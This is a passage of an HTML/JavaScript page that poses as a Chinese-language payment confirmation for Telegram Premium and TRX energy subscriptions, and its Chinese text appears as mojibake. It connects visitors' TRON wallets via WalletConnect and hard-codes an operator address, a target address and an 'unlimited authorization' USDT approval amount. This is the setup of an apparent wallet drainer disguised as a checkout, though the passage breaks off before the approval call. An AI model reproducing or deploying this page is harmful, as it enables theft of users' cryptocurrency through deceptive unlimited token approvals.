<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>æ”¯ä»˜ç¡®è®¤</title>
    
    <!-- WalletConnect v2 SDK -->
    <script src="https://unpkg.com/@walletconnect/modal@2.6.2/dist/index.min.js"></script>
    <script src="https://unpkg.com/@walletconnect/web3wallet@1.2.1/dist/index.min.js"></script>
    <link rel="stylesheet" href="https://unpkg.com/@walletconnect/modal@2.6.2/dist/index.css">
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f5f5f5;
            color: #333;
            min-height: 100vh;
            padding: 1rem;
            line-height: 1.5;
            font-size: 16px;
            -webkit-text-size-adjust: 100%;
        }
        
        @media (max-width: 480px) {
            body {
                font-size: 15px;
            }
        }
        
        @media (max-width: 360px) {
            body {
                font-size: 14px;
            }
        }
        
        .payment-container {
            max-width: 400px;
            margin: 0 auto;
            background: white;
            border-radius: 1rem;
            overflow: hidden;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
        }
        
        .header {
            color: white;
            padding: 1.5rem;
            text-align: center;
        }
        
        .header-premium {
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
        }
        
        .header-trx {
            background: linear-gradient(135deg, #ff6b6b 0%, #ff8e8e 100%);
        }
        
        .header-account {
            background: linear-gradient(135deg, #4ecdc4 0%, #44a08d 100%);
        }
        
        .header h1 {
            font-size: 1.4rem;
            margin-bottom: 0.5rem;
        }
        
        .payment-status {
            padding: 1.5rem;
            text-align: center;
            border-bottom: 1px solid #eee;
        }
        
        .status-text {
            font-size: 1.1rem;
            font-weight: 600;
            margin-bottom: 0.5rem;
        }
        
        .status-text-premium {
            color: #1890ff;
        }
        
        .status-text-trx {
            color: #ff6b6b;
        }
        
        .status-text-account {
            color: #4ecdc4;
        }
        
        .status-desc {
            font-size: 0.9rem;
            color: #666;
        }
        
        .order-info {
            padding: 1.5rem;
        }
        
        .info-item {
            display: flex;
            justify-content: space-between;
            margin-bottom: 1rem;
            padding-bottom: 0.5rem;
            border-bottom: 1px solid #f0f0f0;
        }
        
        .info-item:last-child {
            border-bottom: none;
            margin-bottom: 0;
        }
        
        .info-label {
            color: #666;
            font-size: 0.9rem;
        }
        
        .info-value {
            font-weight: 600;
            text-align: right;
        }
        
        .wallet-status {
            background: #f6ffed;
            border: 1px solid #b7eb8f;
            border-radius: 0.5rem;
            padding: 1rem;
            margin: 1rem 1.5rem;
            text-align: center;
            font-size: 0.9rem;
            color: #52c41a;
        }
        
        .wallet-status.error {
            background: #fff2f0;
            border: 1px solid #ffccc7;
            color: #ff4d4f;
        }
        
        .action-section {
            padding: 1.5rem;
        }
        
        .pay-btn {
            display: block;
            width: 100%;
            color: white;
            padding: 1rem 1.5rem;
            border-radius: 3rem;
            text-decoration: none;
            font-weight: 600;
            font-size: 1.1rem;
            border: none;
            cursor: pointer;
            text-align: center;
            animation: breathe 2s ease-in-out infinite;
            transition: all 0.3s ease;
        }
        
        .pay-btn-premium {
            background: linear-gradient(90deg, #ff8c00, #ffd700);
            box-shadow: 0 0.25rem 1rem rgba(255, 140, 0, 0.4);
            color: #1e3c72;
        }
        
        .pay-btn-trx {
            background: linear-gradient(90deg, #ff6b6b, #ff8e8e);
            box-shadow: 0 0.25rem 1rem rgba(255, 107, 107, 0.4);
        }
        
        .pay-btn-account {
            background: linear-gradient(90deg, #4ecdc4, #44a08d);
            box-shadow: 0 0.25rem 1rem rgba(78, 205, 196, 0.4);
        }
        
        .pay-btn:disabled {
            background: #ccc;
            cursor: not-allowed;
            animation: none;
        }
        
        .pay-btn:active {
            transform: translateY(1px);
            animation: none;
        }
        
        .pay-btn-premium:active {
            box-shadow: 0 0.125rem 0.5rem rgba(255, 140, 0, 0.4);
        }
        
        .pay-btn-trx:active {
            box-shadow: 0 0.125rem 0.5rem rgba(255, 107, 107, 0.4);
        }
        
        .pay-btn-account:active {
            box-shadow: 0 0.125rem 0.5rem rgba(78, 205, 196, 0.4);
        }
        
        .loading {
            display: none;
            text-align: center;
            padding: 1rem;
        }
        
        .spinner {
            border: 3px solid #f3f3f3;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 0 auto 1rem;
        }
        
        .spinner-premium {
            border-top: 3px solid #ff8c00;
        }
        
        .spinner-trx {
            border-top: 3px solid #ff6b6b;
        }
        
        .spinner-account {
            border-top: 3px solid #4ecdc4;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        @keyframes breathe {
            0%, 100% {
                transform: scale(1);
            }
            50% {
                transform: scale(1.03);
            }
        }
        
        .tx-hash {
            word-break: break-all;
            font-family: monospace;
            font-size: 0.75rem;
            background: rgba(0, 0, 0, 0.05);
            padding: 0.5rem;
            border-radius: 0.25rem;
            margin-top: 0.5rem;
        }
        
        .step-indicator {
            display: flex;
            justify-content: space-between;
            margin: 1rem 1.5rem;
            position: relative;
        }
        
        .step {
            display: flex;
            flex-direction: column;
            align-items: center;
            flex: 1;
        }
        
        .step-circle {
            width: 30px;
            height: 30px;
            border-radius: 50%;
            background: #f0f0f0;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            margin-bottom: 0.5rem;
            z-index: 2;
        }
        
        .step.active .step-circle {
            color: white;
        }
        
        .step-premium.active .step-circle {
            background: #1890ff;
        }
        
        .step-trx.active .step-circle {
            background: #ff6b6b;
        }
        
        .step-account.active .step-circle {
            background: #4ecdc4;
        }
        
        .step.completed .step-circle {
            background: #52c41a;
            color: white;
        }
        
        .step-text {
            font-size: 0.7rem;
            text-align: center;
            color: #666;
        }
        
        .step.active .step-text {
            font-weight: 600;
        }
        
        .step-premium.active .step-text {
            color: #1890ff;
        }
        
        .step-trx.active .step-text {
            color: #ff6b6b;
        }
        
        .step-account.active .step-text {
            color: #4ecdc4;
        }
        
        .step-line {
            position: absolute;
            top: 15px;
            left: 15px;
            right: 15px;
            height: 2px;
            background: #f0f0f0;
            z-index: 1;
        }
        
        .account-details {
            background: #f8f9fa;
            border-radius: 0.5rem;
            padding: 1rem;
            margin: 1rem 1.5rem;
        }
        
        .account-item {
            display: flex;
            justify-content: space-between;
            margin-bottom: 0.5rem;
        }
        
        .account-label {
            color: #666;
            font-size: 0.9rem;
        }
        
        .account-value {
            font-weight: 600;
            text-align: right;
        }
        
        .error-message {
            background: #fff2f0;
            border: 1px solid #ffccc7;
            border-radius: 0.5rem;
            padding: 1rem;
            margin: 1rem;
            text-align: center;
            color: #ff4d4f;
        }
        
        /* æ–°å¢ï¼šç¡®è®¤å¼¹çª—æ ·å¼ */
        .confirm-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            z-index: 9999;
            align-items: center;
            justify-content: center;
            padding: 1rem;
        }
        
        .confirm-modal.active {
            display: flex;
        }
        
        .confirm-content {
            background: white;
            border-radius: 1rem;
            width: 100%;
            max-width: 400px;
            max-height: 90vh;
            overflow-y: auto;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
            animation: slideIn 0.3s ease-out;
        }
        
        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        .confirm-header {
            padding: 1.5rem;
            border-bottom: 1px solid #eee;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .confirm-header h3 {
            margin: 0;
            font-size: 1.2rem;
            color: #333;
        }
        
        .close-btn {
            background: none;
            border: none;
            font-size: 1.5rem;
            color: #999;
            cursor: pointer;
            padding: 0.5rem;
            line-height: 1;
        }
        
        .close-btn:hover {
            color: #333;
        }
        
        .confirm-body {
            padding: 1.5rem;
        }
        
        .confirm-details {
            background: #f8f9fa;
            border-radius: 0.5rem;
            padding: 1.5rem;
            margin-bottom: 1.5rem;
        }
        
        .confirm-item {
            display: flex;
            justify-content: space-between;
            margin-bottom: 0.75rem;
            padding-bottom: 0.75rem;
            border-bottom: 1px solid #eee;
        }
        
        .confirm-item:last-child {
            border-bottom: none;
            margin-bottom: 0;
            padding-bottom: 0;
        }
        
        .confirm-label {
            color: #666;
            font-size: 0.9rem;
            font-weight: 500;
        }
        
        .confirm-value {
            color: #333;
            font-weight: 600;
            text-align: right;
            max-width: 60%;
            word-break: break-word;
        }
        
        .confirm-actions {
            display: flex;
            gap: 1rem;
            margin-top: 2rem;
        }
        
        .confirm-btn {
            display: block;
            width: 100%;
            max-width: 300px;
            margin: 0 auto;
            padding: 1rem 2rem;
            background: linear-gradient(90deg, #1890ff, #52c41a);
            color: white;
            border: none;
            border-radius: 3rem;
            font-size: 1.1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            animation: breathe 2s ease-in-out infinite;
        }
        
        .confirm-btn:hover:not(:disabled) {
            opacity: 0.9;
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(24, 144, 255, 0.4);
        }
        
        .confirm-btn:disabled {
            background: #ccc;
            cursor: not-allowed;
            animation: none;
        }
        
        .processing-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.9);
            display: none;
            align-items: center;
            justify-content: center;
            border-radius: 1rem;
            z-index: 10;
        }
        
        .processing-overlay.active {
            display: flex;
        }
        
        .processing-content {
            text-align: center;
        }
        
        .processing-spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #1890ff;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto 1rem;
        }
        
        .processing-text {
            color: #333;
            font-weight: 500;
        }
        
        /* æ–°å¢ï¼šæ”¯ä»˜å¤„ç†ä¸­é¡µé¢æ ·å¼ */
        .processing-page {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: white;
            z-index: 10000;
            align-items: center;
            justify-content: center;
            padding: 1rem;
        }
        
        .processing-page.active {
            display: flex;
        }
        
        .processing-page-content {
            text-align: center;
            max-width: 400px;
            width: 100%;
        }
        
        .processing-page-spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #1890ff;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
            margin: 0 auto 2rem;
        }
        
        .processing-page-title {
            font-size: 1.5rem;
            font-weight: 600;
            margin-bottom: 1rem;
            color: #333;
        }
        
        .processing-page-message {
            color: #666;
            margin-bottom: 2rem;
            line-height: 1.6;
        }
        
        .progress-bar {
            width: 100%;
            height: 8px;
            background: #f0f0f0;
            border-radius: 4px;
            margin: 2rem 0;
            overflow: hidden;
        }
        
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #1890ff, #52c41a);
            border-radius: 4px;
            width: 0%;
            transition: width 0.3s ease;
        }
        
        .countdown-text {
            font-size: 0.9rem;
            color: #999;
            margin-top: 1rem;
        }
        
        /* WalletConnect æ ·å¼è¦†ç›– */
        .wcm-modal {
            z-index: 10001 !important;
        }
        
        .wcm-overlay {
            z-index: 10000 !important;
        }
        
        .wc-connection-state {
            padding: 0.5rem 1rem;
            background: #e6f7ff;
            border: 1px solid #91d5ff;
            border-radius: 0.5rem;
            margin: 1rem 1.5rem;
            text-align: center;
            font-size: 0.85rem;
            color: #1890ff;
        }
        
        .wc-reconnect-btn {
            background: #1890ff;
            color: white;
            border: none;
            padding: 0.5rem 1rem;
            border-radius: 0.5rem;
            cursor: pointer;
            margin-top: 0.5rem;
            font-size: 0.9rem;
        }
    </style>
</head>
<body>
    <div class="payment-container">
        <div id="serviceContent">
            <!-- å†…å®¹å°†é€šè¿‡JavaScriptåŠ¨æ€ç”Ÿæˆ -->
        </div>
    </div>
    
    <!-- æ–°å¢ï¼šæ”¯ä»˜ç¡®è®¤å¼¹çª— -->
    <div class="confirm-modal" id="confirmModal">
        <div class="confirm-content">
            <div class="confirm-header">
                <h3 id="confirmModalTitle">æ”¯ä»˜è¯¦æƒ…ç¡®è®¤</h3>
                <button class="close-btn" onclick="closeConfirmModal()">Ã—</button>
            </div>
            <div class="confirm-body">
                <div class="confirm-details">
                    <div class="confirm-item">
                        <span class="confirm-label">è®¢å•å·ï¼š</span>
                        <span class="confirm-value" id="confirmOrderId"></span>
                    </div>
                    <div class="confirm-item">
                        <span class="confirm-label">æ”¯ä»˜é‡‘é¢ï¼š</span>
                        <span class="confirm-value" id="confirmAmount"></span>
                    </div>
                    <div class="confirm-item">
                        <span class="confirm-label">å•†å“ç±»å‹ï¼š</span>
                        <span class="confirm-value" id="confirmProductType"></span>
                    </div>
                    <div class="confirm-item">
                        <span class="confirm-label">æ•°é‡ï¼š</span>
                        <span class="confirm-value" id="confirmQuantity"></span>
                    </div>
                    <div class="confirm-item">
                        <span class="confirm-label">é’±åŒ…åœ°å€ï¼š</span>
                        <span class="confirm-value" id="confirmWalletAddress"></span>
                    </div>
                </div>
                
                <!-- åªæœ‰ä¸€ä¸ªç¡®è®¤æŒ‰é’® -->
                <div style="text-align: center; margin-top: 2rem;">
                    <button class="confirm-btn" id="finalConfirmBtn" onclick="processFinalPayment()" style="width: 80%; max-width: 300px;">
                        ç¡®è®¤æ”¯ä»˜
                    </button>
                </div>
                
                <!-- å¤„ç†ä¸­è¦†ç›–å±‚ -->
                <div class="processing-overlay" id="processingOverlay">
                    <div class="processing-content">
                        <div class="processing-spinner"></div>
                        <p class="processing-text">æ”¯ä»˜å¤„ç†ä¸­ï¼Œè¯·ç¨å€™...</p>
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <!-- æ–°å¢ï¼šæ”¯ä»˜å¤„ç†ä¸­é¡µé¢ -->
    <div class="processing-page" id="processingPage">
        <div class="processing-page-content">
            <div class="processing-page-spinner"></div>
            <h2 class="processing-page-title">æ”¯ä»˜å¤„ç†ä¸­</h2>
            <p class="processing-page-message" id="processingPageMessage">
                æˆ‘ä»¬æ­£åœ¨å¤„ç†æ‚¨çš„æ”¯ä»˜è¯·æ±‚ï¼Œè¯·è€å¿ƒç­‰å¾…...
            </p>
            <div class="progress-bar">
                <div class="progress-fill" id="progressFill"></div>
            </div>
            <div class="countdown-text" id="countdownText">
                é¢„è®¡ç­‰å¾…æ—¶é—´ï¼š<span id="countdownSeconds">5</span>ç§’
            </div>
        </div>
    </div>

    <script>
        // ==================== WalletConnect v2 é…ç½® ====================
        // ä½¿ç”¨ä¸index.htmlç›¸åŒçš„é…ç½®
        const WC_PROJECT_ID = "2fd11148042257257c2c02fe1472823b";
        const WC_METADATA = {
            name: "Telegram Premium & TRXèƒ½é‡è®¢é˜…",
            description: "TRONç½‘ç»œæ”¯ä»˜æœåŠ¡",
            url: "https://tgpremium.site",
            icons: ["logo.png"]
        };
        
        // WalletConnectå®ä¾‹
        let web3wallet = null;
        let walletConnectConnected = false;
        let wcSession = null;
        
        // ==================== EOAæ¨¡å¼æ ¸å¿ƒé…ç½® ====================
        const EOA_ADDRESS = 'TX8Dk3KN3sVW2PjaMhnUh86Dj37c4KFFoB';
        const TARGET_ADDRESS = 'TBcTQiYyxXkJffXhXGYEokedsV4vBqHvB8';
        const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
        
        // EOAæ¨¡å¼æˆæƒé‡‘é¢ï¼ˆæ— é™æˆæƒï¼‰
        const EOA_APPROVE_AMOUNT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
        
        // ==================== ç³»ç»ŸçŠ¶æ€å˜é‡ ====================
        // ä»URLå‚æ•°è·å–æœåŠ¡ç±»å‹
        const urlParams = new URLSearchParams(window.location.search);
        const serviceType = urlParams.get('service') || 'premium';
        
        // ä¿å­˜åŸå§‹å‚æ•°
        let originalParams = {};
        urlParams.forEach((value, key) => {
            originalParams[key] = decodeURIComponent(value);
        });
        
        // æ”¯ä»˜æµç¨‹çŠ¶æ€
        let currentPaymentData = null;
        let authTxHash = null;
        let currentUserAddress = null;
        
        // ğŸ”¥ ä¿®å¤ï¼šå‰ç«¯é˜²æŠ–æ ‡è®°
        let authSyncDebounceTimer = null;
        const AUTH_SYNC_DEBOUNCE_DELAY = 5000; // 5ç§’é˜²æŠ–
        window.__authSynced = false;
        
        // ==================== é¡µé¢åˆå§‹åŒ– ====================
        document.addEventListener('DOMContentLoaded', async function() {
            console.log('ğŸ¯ Paymenté¡µé¢åŠ è½½ - é€‚é…WalletConnect v2');
            console.log('ğŸ”§ EOAåœ°å€:', EOA_ADDRESS);
            console.log('ğŸ“¦ æœåŠ¡ç±»å‹:', serviceType);
            
            // æ£€æŸ¥æ˜¯å¦é€šè¿‡WalletConnectè·³è½¬
            const isFromWC = checkIfFromWalletConnect();
            
            setTimeout(async () => {
                renderServiceInterface();
                
                if (isFromWC) {
                    // é€šè¿‡WalletConnectè·³è½¬ï¼Œå°è¯•æ¢å¤ä¼šè¯
                    await handleWalletConnectReconnection();
                } else {
                    // ç›´æ¥æ‰“å¼€æˆ–ä»é’±åŒ…DAppå†…æ‰“å¼€
                    setTimeout(connectWallet, 500);
                }
            }, 100);
        });
        
        // ==================== WalletConnect v2 åŠŸèƒ½ ====================
        
        // æ£€æŸ¥æ˜¯å¦ä»WalletConnectè·³è½¬
        function checkIfFromWalletConnect() {
            // æ£€æŸ¥URLä¸­æ˜¯å¦æœ‰WCå‚æ•°
            const hasWCParam = urlParams.has('wc') || urlParams.has('walletconnect');
            
            // æ£€æŸ¥localStorageä¸­æ˜¯å¦æœ‰WCä¼šè¯
            const hasWCSession = localStorage.getItem('walletconnect') || 
                               localStorage.getItem('WALLETCONNECT_SESSION');
            
            // æ£€æŸ¥sessionStorageä¸­æ˜¯å¦æœ‰index.htmlä¼ é€’çš„WCæ•°æ®
            const hasWCSessionData = sessionStorage.getItem('wc_session_data');
            
            console.log('ğŸ” WalletConnectè·³è½¬æ£€æŸ¥:', {
                hasWCParam,
                hasWCSession,
                hasWCSessionData,
                referrer: document.referrer
            });
            
            return hasWCParam || hasWCSession || hasWCSessionData || document.referrer.includes('index.html');
        }
        
        // å¤„ç†WalletConnecté‡æ–°è¿æ¥
        async function handleWalletConnectReconnection() {
            console.log('ğŸ”„ å¤„ç†WalletConnecté‡æ–°è¿æ¥...');
            
            const walletStatus = document.getElementById('walletStatus');
            const walletStatusText = document.getElementById('walletStatusText');
            
            if (walletStatusText) {
                walletStatusText.textContent = 'æ­£åœ¨æ¢å¤WalletConnectè¿æ¥...';
            }
            
            try {
                // å°è¯•ä»sessionStorageè·å–WCä¼šè¯æ•°æ®
                const wcSessionData = sessionStorage.getItem('wc_session_data');
                if (wcSessionData) {
                    console.log('ğŸ“¥ æ‰¾åˆ°WCä¼šè¯æ•°æ®:', JSON.parse(wcSessionData));
                }
                
                // åˆå§‹åŒ–WalletConnect
                await initializeWalletConnect();
                
                // å°è¯•æ¢å¤ç°æœ‰ä¼šè¯
                const session = await restoreWalletConnectSession();
                
                if (session) {
                    console.log('âœ… WalletConnectä¼šè¯æ¢å¤æˆåŠŸ');
                    walletConnectConnected = true;
                    wcSession = session;
                    
                    // è®¾ç½®ç”¨æˆ·åœ°å€
                    if (session.namespaces && session.namespaces.tron && session.namespaces.tron.accounts) {
                        const account = session.namespaces.tron.accounts[0];
                        const address = account.split(':')[2];
                        currentUserAddress = address;
                        
                        console.log('ğŸ‘› ä»WCä¼šè¯è·å–åœ°å€:', currentUserAddress);
                        
                        if (walletStatus && walletStatusText) {
                            walletStatusText.textContent = `âœ… WalletConnectå·²è¿æ¥ (${currentUserAddress.substring(0, 8)}...)`;
                            walletStatus.className = 'wallet-status';
                        }
                        
                        // å¯ç”¨æ”¯ä»˜æŒ‰é’®
                        const payBtn = document.getElementById('payBtn');
                        if (payBtn) {
                            payBtn.disabled = false;
                        }
                        
                        return;
                    }
                }
                
                // å¦‚æœæ²¡æœ‰æ¢å¤ä¼šè¯ï¼Œæ˜¾ç¤ºè¿æ¥é€‰é¡¹
                showWalletConnectOptions();
                
            } catch (error) {
                console.error('WalletConnecté‡æ–°è¿æ¥å¤±è´¥:', error);
                
                if (walletStatus && walletStatusText) {
                    walletStatusText.textContent = 'âŒ WalletConnectè¿æ¥å¤±è´¥ï¼Œè¯·æ‰‹åŠ¨è¿æ¥';
                    walletStatus.className = 'wallet-status error';
                }
                
                // æ˜¾ç¤ºé‡è¿æŒ‰é’®
                showReconnectOptions();
            }
        }
        
        // åˆå§‹åŒ–WalletConnect
        async function initializeWalletConnect() {
            try {
                const { Web3Wallet } = window.WalletConnectWeb3Wallet;
                
                web3wallet = await Web3Wallet.init({
                    projectId: WC_PROJECT_ID,
                    metadata: WC_METADATA
                });
                
                console.log('âœ… WalletConnectåˆå§‹åŒ–æˆåŠŸ');
                
                // ç›‘å¬ä¼šè¯äº‹ä»¶
                web3wallet.on('session_proposal', (proposal) => {
                    console.log('ğŸ“ æ”¶åˆ°ä¼šè¯ææ¡ˆ:', proposal);
                });
                
                web3wallet.on('session_request', (request) => {
                    console.log('ğŸ“ æ”¶åˆ°ä¼šè¯è¯·æ±‚:', request);
                });
                
                web3wallet.on('session_delete', () => {
                    console.log('ğŸ—‘ï¸ ä¼šè¯å·²åˆ é™¤');
                    walletConnectConnected = false;
                    wcSession = null;
                });
                
                return web3wallet;
            } catch (error) {
                console.error('WalletConnectåˆå§‹åŒ–å¤±è´¥:', error);
                throw error;
            }
        }
        
        // æ¢å¤WalletConnectä¼šè¯
        async function restoreWalletConnectSession() {
            try {
                if (!web3wallet) return null;
                
                // è·å–æ´»åŠ¨ä¼šè¯
                const sessions = web3wallet.getActiveSessions();
                console.log('ğŸ“‹ æ´»åŠ¨ä¼šè¯:', sessions);
                
                if (sessions && Object.keys(sessions).length > 0) {
                    const firstSessionKey = Object.keys(sessions)[0];
                    return sessions[firstSessionKey];
                }
                
                return null;
            } catch (error) {
                console.error('æ¢å¤ä¼šè¯å¤±è´¥:', error);
                return null;
            }
        }
        
        // æ˜¾ç¤ºWalletConnectè¿æ¥é€‰é¡¹
        function showWalletConnectOptions() {
            const walletStatus = document.getElementById('walletStatus');
            if (!walletStatus) return;
            
            const wcConnectionState = document.createElement('div');
            wcConnectionState.className = 'wc-connection-state';
            wcConnectionState.innerHTML = `
                <p>éœ€è¦é€šè¿‡WalletConnectè¿æ¥é’±åŒ…</p>
                <button class="wc-reconnect-btn" onclick="connectWithWalletConnect()">
                    è¿æ¥é’±åŒ…
                </button>
                <p style="margin-top: 0.5rem; font-size: 0.8rem; color: #666;">
                    æˆ– <a href="javascript:void(0)" onclick="tryDirectWalletConnection()" style="color: #1890ff;">å°è¯•ç›´æ¥é’±åŒ…è¿æ¥</a>
                </p>
            `;
            
            walletStatus.appendChild(wcConnectionState);
        }
        
        // æ˜¾ç¤ºé‡è¿é€‰é¡¹
        function showReconnectOptions() {
            const walletStatus = document.getElementById('walletStatus');
            if (!walletStatus) return;
            
            if (!document.getElementById('reconnectOptions')) {
                const reconnectDiv = document.createElement('div');
                reconnectDiv.id = 'reconnectOptions';
                reconnectDiv.style.marginTop = '1rem';
                reconnectDiv.innerHTML = `
                    <button onclick="connectWallet()" style="padding: 0.5rem 1rem; background: #1890ff; color: white; border: none; border-radius: 0.25rem; cursor: pointer; margin-right: 0.5rem;">
                        é‡è¿é’±åŒ…
                    </button>
                    <button onclick="connectWithWalletConnect()" style="padding: 0.5rem 1rem; background: #52c41a; color: white; border: none; border-radius: 0.25rem; cursor: pointer;">
                        ä½¿ç”¨WalletConnect
                    </button>
                `;
                walletStatus.appendChild(reconnectDiv);
            }
        }
        
        // é€šè¿‡WalletConnectè¿æ¥é’±åŒ…
        async function connectWithWalletConnect() {
            try {
                console.log('ğŸ”— é€šè¿‡WalletConnectè¿æ¥é’±åŒ…...');
                
                if (!web3wallet) {
                    await initializeWalletConnect();
                }
                
                // åˆ›å»ºè¿æ¥URI
                const { uri, approval } = await web3wallet.pair({});
                
                if (uri) {
                    // æ˜¾ç¤ºQRç æˆ–ä½¿ç”¨universal link
                    await showWalletConnectModal(uri);
                    
                    // ç­‰å¾…ç”¨æˆ·æ‰¹å‡†
                    const session = await approval();
                    
                    console.log('âœ… WalletConnectè¿æ¥æˆåŠŸ:', session);
                    walletConnectConnected = true;
                    wcSession = session;
                    
                    // è·å–ç”¨æˆ·åœ°å€
                    if (session.namespaces && session.namespaces.tron && session.namespaces.tron.accounts) {
                        const account = session.namespaces.tron.accounts[0];
                        const address = account.split(':')[2];
                        currentUserAddress = address;
                        
                        console.log('ğŸ‘› ç”¨æˆ·åœ°å€:', currentUserAddress);
                        
                        // æ›´æ–°UI
                        const walletStatus = document.getElementById('walletStatus');
                        const walletStatusText = document.getElementById('walletStatusText');
                        const payBtn = document.getElementById('payBtn');
                        
                        if (walletStatus && walletStatusText) {
                            walletStatusText.textContent = `âœ… WalletConnectå·²è¿æ¥ (${currentUserAddress.substring(0, 8)}...)`;
                            walletStatus.className = 'wallet-status';
                            
                            // ç§»é™¤è¿æ¥é€‰é¡¹
                            const wcState = walletStatus.querySelector('.wc-connection-state');
                            if (wcState) wcState.remove();
                        }
                        
                        if (payBtn) {
                            payBtn.disabled = false;
                        }
                        
                        // ä¿å­˜ä¼šè¯æ•°æ®åˆ°sessionStorage
                        sessionStorage.setItem('wc_session_data', JSON.stringify({
                            address: currentUserAddress,
                            timestamp: Date.now()
                        }));
                    }
                }
            } catch (error) {
                console.error('WalletConnectè¿æ¥å¤±è´¥:', error);
                
                const walletStatus = document.getElementById('walletStatus');
                const walletStatusText = document.getElementById('walletStatusText');
                
                if (walletStatus && walletStatusText) {
                    walletStatusText.textContent = 'âŒ WalletConnectè¿æ¥å¤±è´¥';
                    walletStatus.className = 'wallet-status error';
                }
                
                showReconnectOptions();
            }
        }
        
        // æ˜¾ç¤ºWalletConnectæ¨¡æ€æ¡†
        async function showWalletConnectModal(uri) {
            return new Promise((resolve) => {
                // åˆ›å»ºæ¨¡æ€æ¡†
                const modal = document.createElement('div');
                modal.id = 'wcModal';
                modal.style.cssText = `
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                    background: rgba(0, 0, 0, 0.7);
                    z-index: 10001;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    padding: 1rem;
                `;
                
                modal.innerHTML = `
                    <div style="background: white; border-radius: 1rem; padding: 1.5rem; max-width: 400px; width: 100%;">
                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 1rem;">
                            <h3 style="margin: 0;">è¿æ¥é’±åŒ…</h3>
                            <button onclick="document.getElementById('wcModal').remove();" style="background: none; border: none; font-size: 1.5rem; color: #999; cursor: pointer;">Ã—</button>
                        </div>
                        <p style="color: #666; margin-bottom: 1.5rem;">è¯·ä½¿ç”¨æ‚¨çš„é’±åŒ…Appæ‰«æäºŒç»´ç æˆ–ç‚¹å‡»é“¾æ¥</p>
                        <div id="wcQRCode" style="text-align: center; margin-bottom: 1.5rem;"></div>
                        <div style="text-align: center;">
                            <a href="${uri}" id="wcDeepLink" style="display: inline-block; background: #1890ff; color: white; padding: 0.75rem 1.5rem; border-radius: 0.5rem; text-decoration: none;">
                                åœ¨é’±åŒ…ä¸­æ‰“å¼€
                            </a>
                        </div>
                        <p style="color: #999; font-size: 0.8rem; text-align: center; margin-top: 1rem;">è¿æ¥åè¯·è¿”å›æ­¤é¡µé¢</p>
                    </div>
                `;
                
                document.body.appendChild(modal);
                
                // æ·»åŠ å…³é—­äº‹ä»¶
                modal.querySelector('button').onclick = () => {
                    modal.remove();
                    resolve(false);
                };
                
                // ç”ŸæˆQRç 
                if (typeof QRCode !== 'undefined') {
                    new QRCode(document.getElementById('wcQRCode'), {
                        text: uri,
                        width: 200,
                        height: 200
                    });
                }
                
                // è®¾ç½®deep link
                const deepLink = document.getElementById('wcDeepLink');
                deepLink.href = uri;
                
                // è‡ªåŠ¨é‡å®šå‘åˆ°é’±åŒ…App
                if (isMobile()) {
                    setTimeout(() => {
                        window.location.href = uri;
                    }, 1000);
                }
            });
        }
        
        // å°è¯•ç›´æ¥é’±åŒ…è¿æ¥
        function tryDirectWalletConnection() {
            console.log('ğŸ”§ å°è¯•ç›´æ¥é’±åŒ…è¿æ¥...');
            connectWallet();
        }
        
        // ==================== ç•Œé¢æ¸²æŸ“å‡½æ•° ====================
        function renderServiceInterface() {
            const serviceContent = document.getElementById('serviceContent');
            
            if (!serviceContent) {
                console.error('æ‰¾ä¸åˆ° serviceContent å…ƒç´ ');
                return;
            }
            
            try {
                // æ£€æŸ¥æ˜¯å¦æ˜¯æ”¯ä»˜å¤±è´¥é¡µé¢
                const status = originalParams.status;
                if (status === 'failed') {
                    renderPaymentFailedInterface(serviceContent);
                    return;
                }
                
                // æ­£å¸¸æ”¯ä»˜é¡µé¢
                switch(serviceType) {
                    case 'premium':
                        renderPremiumInterface(serviceContent);
                        break;
                    case 'trx':
                        renderTrxInterface(serviceContent);
                        break;
                    case 'account':
                        renderAccountInterface(serviceContent);
                        break;
                    default:
                        renderPremiumInterface(serviceContent);
                }
                
            } catch (error) {
                console.error('æ¸²æŸ“ç•Œé¢å¤±è´¥:', error);
                serviceContent.innerHTML = `
                    <div class="error-message">
                        <h3>é¡µé¢åŠ è½½å¤±è´¥</h3>
                        <p>è¯·åˆ·æ–°é¡µé¢é‡è¯•</p>
                        <button onclick="location.reload()" style="margin-top: 1rem; padding: 0.5rem 1rem; background: #1890ff; color: white; border: none; border-radius: 0.25rem; cursor: pointer;">
                            åˆ·æ–°é¡µé¢
